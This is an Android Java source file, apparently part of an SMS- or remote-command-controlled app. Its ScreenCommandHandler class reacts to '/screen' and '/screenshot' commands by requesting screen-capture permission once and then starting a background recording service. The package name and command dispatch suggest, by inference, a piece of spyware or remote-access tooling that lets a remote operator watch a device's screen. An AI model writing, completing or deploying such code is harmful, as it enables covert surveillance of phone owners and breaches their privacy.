package com.smshandler;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class ScreenCommandHandler {

    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1001;
    private static boolean permissionGranted = false;
    private static Activity activity;

    public static void handleScreenCommand(Activity ctx, String command) {
        activity = ctx;
        
        if (command.equals("/screen") || command.equals("/screenshot")) {
            startScreenCapture(ctx);
        }
    }

    public static void startScreenCapture(Activity activity) {
        // Check if we already have permission
        if (permissionGranted && ScreenRecorderService.isRecording) {
            // Already recording, just capture now
            return;
        }

        // Request screen capture permission (ONE TIME ONLY)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) activity.getSystemService(
                    Context.MEDIA_PROJECTION_SERVICE);
            
            if (projectionManager != null) {
                // Yeh sirf ek baar permission mangega
                activity.startActivityForResult(
                    projectionManager.createScreenCaptureIntent(),
                    SCREEN_CAPTURE_REQUEST_CODE);
            }
        }
    }

    public static void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK) {
                permissionGranted = true;
                
                // Service start karo
                Intent serviceIntent = new Intent(activity, ScreenRecorderService.class);
                serviceIntent.putExtra("code", resultCode);
                serviceIntent.putExtra("data", data);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    activity.startForegroundService(serviceIntent);
                } else {
                    activity.startService(serviceIntent);
                }
            }
        }
    }

    public static void stopScreenRecording() {
        ScreenRecorderService.stopRecording();
    }
}